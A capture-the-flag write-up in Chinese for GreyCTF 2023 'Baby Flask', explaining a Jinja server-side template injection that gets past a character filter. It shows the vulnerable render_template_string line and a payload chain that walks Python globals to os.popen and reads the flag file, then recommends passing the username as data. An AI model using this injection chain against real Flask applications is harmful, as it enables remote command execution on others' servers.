# GreyCTF 2023 Baby Flask

## 题目简述

登录接口把用户名放进 JWT，主页验证后又通过 f-string 拼入 `render_template_string`。用户名正好位于服务器预置的 `{{ ... }}` 内，因此形成 SSTI。过滤器只允许字母、圆括号、加号和竖线，并屏蔽少量单词，但 Jinja 过滤器足以在不直接输入引号、下划线或数字的情况下构造任意字符串和属性链。

## 解题过程

主页的核心语句为：

```python
render_template_string(f"Welcome {{{{{username}}}}}!")
```

所以用户名不需要自行提供花括号，只需是一条合法 Jinja 表达式。`True|int`、`False|int` 以及对象的 `length` 可构造整数；从 `config|string`、`self|string` 等稳定字符串中使用 `first`、`last`、`slice`、`list`、`sort` 和 `unique` 抽取字符，再用 `+` 拼出 `__init__`、`__globals__`、`__getitem__`、`__builtins__`、`__import__` 等名字。

完成字符映射后，表达式的语义为：

```jinja2
self
|attr("__init__")
|attr("__globals__")
|attr("__getitem__")("__builtins__")
|attr("__getitem__")("__import__")
("os")
|attr("popen")("cat flag/flag.txt")
|attr("read")()
```

实际提交时，上述引号和下划线都由字符提取表达式替代，最终字符集合仍只包含过滤器允许的字母、`|`、`+` 和括号。用该用户名登录并访问主页，模板输出：

```text
greyctf{(ssti|W1th|M1n1m41|Ch425)+}
```

## 方法总结

限制字符集并不能让不可信数据安全地进入模板源代码。Jinja 自带的对象、过滤器和属性访问可从已有字符串合成被禁字符，再沿 Python 对象图到达命令执行。正确修复是使用固定模板并把用户名作为数据变量传入，而不是继续扩充黑名单。
